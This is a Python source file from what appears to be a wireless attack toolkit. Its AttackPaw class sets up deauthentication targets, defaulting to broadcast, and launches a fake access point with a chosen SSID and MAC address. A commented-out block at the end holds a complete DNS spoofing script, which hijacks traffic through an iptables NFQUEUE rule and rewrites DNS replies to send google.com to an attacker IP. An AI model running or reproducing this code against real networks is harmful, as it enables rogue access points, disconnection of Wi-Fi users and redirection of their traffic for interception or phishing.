import multiprocessing
from scapy.volatile import RandMAC
from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Beacon
from scapy.sendrecv import sendp

from objects.accesspoint import AccessPoint
from objects.interfaces import Interface

from paws.util_paw import UtilPaw
from paws.iface_paw import IfacePaw

class AttackPaw(IfacePaw):

    __util_paw = None

    # general
    _verbose = False

    # deauth
    _target_mac = ''
    _target_network_mac = ''
    _interval = .1
    _count = 0

    # access point
    _ssid = ''
    _mac_address = ''
    _interval = 0.1

    _access_point = None


    def __init__(self, util_paw: UtilPaw) -> None:
        self.__util_paw = util_paw
        super().__init__(self.__util_paw)

    def set_verbose(self, verbose: bool) -> None:
        self._verbose = verbose

    def set_target_network_mac(self, target_network_mac: str) -> None:
        self._target_network_mac  = target_network_mac

    def set_target_mac(self, target_mac: str) -> None:
        self._target_mac = 'ff:ff:ff:ff:ff:ff' if not target_mac else target_mac # if target_mac not defined use broadcast

    def set_interval(self, interval: float) -> None:
        self._interval = interval

    def set_interface(self, interface: str) -> None:
        return super().set_interface(interface)

    def set_count(self, count: int) -> None:
        self._count = count
    
    def set_ssid(self, ssid: str):
        self._ssid = ssid

    def set_mac_address(self, mac_address: str):
        self._mac_address = mac_address
    
    def get_random_mac_address(self) -> str:
        return str(RandMAC())
    
    def fake_ap(self) -> None:
        access_point = AccessPoint(
            ssid=self._ssid,
            interface=self._interface,
            interval=self._interval,
            mac_address=self._mac_address,
        )

        access_point.appear()



'''
# DNS mapping records, feel free to add/modify this dictionary
# for example, google.com will be redirected to 192.168.1.100
dns_hosts = {
    b"www.google.com.": "192.168.1.100",
    b"google.com.": "192.168.1.100",
    b"facebook.com.": "172.217.19.142"
}

def process_packet(packet):
    """
    Whenever a new packet is redirected to the netfilter queue,
    this callback is called.
    """
    # convert netfilter queue packet to scapy packet
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(DNSRR):
        # if the packet is a DNS Resource Record (DNS reply)
        # modify the packet
        print("[Before]:", scapy_packet.summary())
        try:
            scapy_packet = modify_packet(scapy_packet)
        except IndexError:
            # not UDP packet, this can be IPerror/UDPerror packets
            pass
        print("[After ]:", scapy_packet.summary())
        # set back as netfilter queue packet
        packet.set_payload(bytes(scapy_packet))
    # accept the packet
    packet.accept()


def modify_packet(packet):
    """
    Modifies the DNS Resource Record `packet` ( the answer part)
    to map our globally defined `dns_hosts` dictionary.
    For instance, whenver we see a google.com answer, this function replaces 
    the real IP address (172.217.19.142) with fake IP address (192.168.1.100)
    """
    # get the DNS question name, the domain name
    qname = packet[DNSQR].qname
    if qname not in dns_hosts:
        # if the website isn't in our record
        # we don't wanna modify that
        print("no modification:", qname)
        return packet
    # craft new answer, overriding the original
    # setting the rdata for the IP we want to redirect (spoofed)
    # for instance, google.com will be mapped to "192.168.1.100"
    packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
    # set the answer count to 1
    packet[DNS].ancount = 1
    # delete checksums and length of packet, because we have modified the packet
    # new calculations are required ( scapy will do automatically )
    del packet[IP].len
    del packet[IP].chksum
    del packet[UDP].len
    del packet[UDP].chksum
    # return the modified packet
    return packet


if __name__ == "__main__":
    QUEUE_NUM = 0
    # insert the iptables FORWARD rule
    os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(QUEUE_NUM))
    # instantiate the netfilter queue
    queue = NetfilterQueue()
    try:
        # bind the queue number to our callback `process_packet`
        # and start it
        queue.bind(QUEUE_NUM, process_packet)
        queue.run()
    except KeyboardInterrupt:
        # if want to exit, make sure we
        # remove that rule we just inserted, going back to normal.
        os.system("iptables --flush")
'''